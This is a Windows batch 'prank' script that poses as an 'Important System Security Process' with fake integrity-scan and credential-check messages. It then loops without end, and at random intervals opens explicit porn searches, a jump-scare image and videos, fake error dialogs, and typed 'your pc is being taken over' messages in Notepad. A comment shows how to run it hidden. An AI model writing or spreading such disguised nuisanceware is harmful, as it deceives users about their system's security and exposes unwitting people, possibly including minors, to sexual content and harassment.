@echo off
title Important System Security Process

echo.
echo  Initializing system integrity scan...
timeout /t 3 /nobreak > nul
echo  Verifying user credentials...
timeout /t 2 /nobreak > nul
echo  Scan complete. Monitoring for anomalies...
timeout /t 2 /nobreak > nul
cls

:prankLoop
rem Generate a random number between 0 and 10
set /a "action=%RANDOM% * 10 / 32768"

rem Wait for a random time between 1 and 5 minutes
set /a "delay=%RANDOM% * 240 / 32768 + 60"
timeout /t %delay% /nobreak > nul

if %action%==0 goto openApp
if %action%==1 goto fakeMessage
if %action%==2 goto openBrowser
if %action%==3 goto systemBeep
if %action%==4 goto whyAmIGay
if %action%==5 goto gayPornExtreme
if %action%==6 goto ghostFace
if %action%==7 goto rickRoll
if %action%==8 goto randomRussian
if %action%==9 goto bomb

:openApp
start calc.exe
goto prankLoop

:fakeMessage
msg * "Error: Keyboard not detected. Press any key to continue."
goto prankLoop

:openBrowser
start "" "https://www.google.com/search?q=gay+porn+xxx"
goto prankLoop

:systemBeep
echo ^G
goto prankLoop

:whyAmIGay
start "" "https://youtu.be/Pknipcp78No?si=ATqy0NJbJzfeq8xm"
goto prankLoop

:gayPornExtreme
start "" "https://www.google.com/search?q=gay+porn+extreme"
goto prankLoop

:ghostFace
start "" "https://thumbs.dreamstime.com/b/scary-ghost-face-halloween-theme-scary-ghost-face-halloween-themes-197450460.jpg?w=992"
goto prankLoop

:rickRoll
start "" "https://www.youtube.com/watch?v=xvFZjo5PgG0&list=RDxvFZjo5PgG0&start_radio=1"
goto prankLoop

:randomRussian
start notepad.exe
timeout /t 1 /nobreak > nul
wscript keypress.vbs "your pc is about to be taken over by the russian empire"
wscript keypress.vbs "{ENTER}"
wscript keypress.vbs "Ваш компьютер вот-вот будет захвачен Российской империей"
wscript keypress.vbs "{ENTER}"
wscript keypress.vbs "абвгдеёжзийклмнопрстуфхцчшщъыьэюя"
goto prankLoop

:bomb
start "" "https://www.youtube.com/watch?v=sVuvtfY8RiE"
goto prankLoop

@REM Start-Process -WindowStyle hidden -FilePath "prank.bat"